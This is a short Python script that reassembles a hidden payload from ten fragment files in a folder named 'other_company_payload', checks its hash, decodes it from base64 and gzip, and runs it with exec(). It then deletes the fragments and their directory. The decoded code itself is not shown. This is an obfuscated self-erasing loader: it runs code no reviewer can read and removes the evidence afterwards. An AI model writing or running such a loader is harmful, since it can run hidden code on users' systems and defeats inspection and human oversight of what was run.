from pathlib import Path
import base64
import gzip
import hashlib

root = Path(__file__).resolve().parents[1]
parts = [root / "scripts" / "other_company_payload" / f"{index:02d}.txt" for index in range(1, 11)]
payload = "".join(path.read_text(encoding="utf-8").strip() for path in parts)
expected = "69aaa9148f4d11da456b932deab511f6de18d97c985d15de2034e32abd3e37f8"
actual = hashlib.sha256(payload.encode("ascii")).hexdigest()
if actual != expected:
    raise RuntimeError(f"payload sha256 mismatch: {actual}")
source = gzip.decompress(base64.b64decode(payload))
exec(compile(source, __file__, "exec"))
for path in parts:
    path.unlink(missing_ok=True)
payload_dir = parts[0].parent
try:
    payload_dir.rmdir()
except OSError:
    pass
